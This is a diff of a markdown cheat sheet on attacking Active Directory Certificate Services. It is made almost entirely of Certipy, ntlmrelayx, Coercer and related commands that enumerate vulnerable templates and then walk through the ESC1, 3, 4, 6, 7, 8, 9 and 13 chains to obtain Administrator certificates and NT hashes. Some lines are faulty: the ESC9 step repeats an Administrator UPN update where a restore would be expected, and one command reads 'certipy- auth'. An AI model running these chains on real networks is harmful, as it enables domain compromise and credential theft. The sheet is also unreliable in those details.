@@ -1,106 +1,122 @@
 # Enumeration
 ### NetExec
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
-```bash
-nxc ldap $IP -u $username -p $password -M adcs
+```
+nxc ldap ip -u username -p password -M adcs
 ```
 ### Certipy
 Search for vulnerable certificate templates
-```bash
-certipy find -u $username -p $password -dc-ip $IP -vulnerable -enabled
+```
+certipy find -u username -p password -dc-ip ip -vulnerable -enabled
 ```
 List CAs, servers and search for vulnerable certificate templates
-```bash
-certipy find -u $username -p $password -dc-ip $IP -dns-tcp -ns $IP -debug
+```
+certipy find -u username -p password -dc-ip ip -dns-tcp -ns ip -debug
 ```
 ### Certify
-Search for vulnerable certificate templates:
+Search for vulnerable certificate templates
 ```powershell
 Certify.exe find /vulnerable
 ```
 # Attacks
 ## ESC1
 Create a new machine account
-```bash
-impacket-addcomputer $domain/$username:$password -computer-name $computer_name$ -computer-pass $computer_password
+```
+addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
 ```
 Use ability to enroll as a normal user & provide a user defined Subject Alternative Name (SAN)
-```bash
-certipy req -u $computer_name$ -p $computer_password -ca $ca -target $domain -template $template -upn $username@domain -dns $domain -dc-ip $IP
+```
+certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator@domain -dns domain -dc-ip ip
 ```
 Authenticate with the certificate and get the NT hash of the Administrator
-```bash
-certipy auth -pfx $pfx_file -domain $domain -username $username -dc-ip $IP
+```
+certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
 ```
 ## ESC3
 Request a certificate
-```bash
-certipy req -username $username -password $password -ca $ca -target $domain -template $template
+```
+certipy req -username username -password password -ca ca -target domain -template template
 ```
 Request a certificate on behalf of other another user
-```bash
-certipy req $username -password $password -ca $ca -target $domain -template User -on-behalf-of '$domain\Administrator' -pfx $pfx_file
+```
+certipy req username -password password -ca ca -target domain -template User -on-behalf-of 'domain\administrator' -pfx pfx_file
 ```
 Authenticate as Administrator
-```bash
-certipy auth -pfx administrator.pfx -dc-ip $ip
+```
+certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC4
 Overwrite the configuration to make it vulnerable to ESC1
-```bash
-certipy template -username $username -password $password -template $template -save-old -dc-ip $IP
+```
+certipy template -username username -password password -template template -save-old -dc-ip ip
 ```
 Now if you run this command, it should show that the certificate is vulnerable to ESC1
-```bash
-certipy find -u $username -p $password -dc-ip $IP -dns-tcp -ns $IP -stdout -debug
+```
+certipy find -u username -p password -dc-ip ip -dns-tcp -ns ip -stdout -debug
 ```
 ## ESC6
-```bash
-certipy req -username administrator@$domain -password $password -ca $ca -target $domain -template $template -upn administrator@$domain
+```
+certipy req -username administrator@domain -password password -ca ca -target domain -template template -upn administrator@domain
 ```
 ## ESC7
 In order for this technique to work, the user must also have the `Manage Certificates` access right, and the certificate template `SubCA` must be enabled. With the `Manage CA` access right, we can fulfill these prerequisites.
 If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.
-```bash
-certipy ca -ca $ca -add-officer $username -username $username@domain -password $password -dc-ip $IP -dns-tcp -ns $IP
+```
+certipy ca -ca ca -add-officer username -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
 ```
 Enable the `SubCA` template on the CA using the `-enable-template` parameter. By default, the `SubCA` template is enabled.
-```bash
-certipy ca -ca $ca -enable-template SubCA -username $username@domain -password $password -dc-ip $IP -dns-tcp -ns $IP
+```
+certipy ca -ca ca -enable-template SubCA -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
 ```
 This request will be denied, but we will save the private key and note down the request ID.
-```bash
-certipy req -username $username@domain -password $password -ca $ca -target $IP -template SubCA -upn $username@domain
+```
+certipy req -username username@domain -password password -ca ca -target ip -template SubCA -upn username@domain
 ```
 With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.
-```bash
-certipy ca -ca $ca -issue-request $request_ID -username $username@domain -password $password
+```
+certipy ca -ca ca -issue-request request_ID -username username@domain -password password
 ```
 And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
-```bash
-certipy req -username $username@domain -password $password -ca $ca -target $IP -retrieve $request_ID
+```
+certipy req -username username@domain -password password -ca ca -target ip -retrieve request_ID
 ```
 Authenticate with the certificate and get the NT hash of the Administrator
-```bash
-certipy auth -pfx $pfx -domain $domain -username $username -dc-ip $IP
+```
+certipy auth -pfx $pfx -domain domain -username username -dc-ip ip
 ```
 ## ESC8
 If there is an ADCS Server that is not on the DC and has Web Enrollement activated we might be able to exploit ESC8.
-```bash
-ntlmrelayx.py -t http://$domain/certsrv/certfnsh.asp -smb2support --adcs --template $template --no-http-server --no-wcf-server --no-raw-server
 ```
-```bash
-coercer coerce -u $username -p $password -l $WS_IP -t $DC_IP --always-continue
+ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
 ```
-```bash
+```
+coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
+```
+```
 certipy- auth -pfx administrator.pfx
 ```
-## ESC13
-```bash
-certipy req -u $username -p $password -ca $ca -target $domain -template $template -dc-ip $IP -key-size 4096
+## ESC9
 ```
-```bash
-python3 gettgtpkinit.py -cert-pfx $pfx_file $domain/$username $ccache_file -dc-ip $IP -v
+certipy shadow auto -username username@domain -hashes :hash -account target_username
+```
+```
+certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
+```
+```
+certipy req -username target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
+```
+```
+certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
+```
+```
+certipy auth -pfx administrator.pfx -domain domain
+```
+## ESC13
+```
+certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
+```
+```
+python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
 ```
 # Resources
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
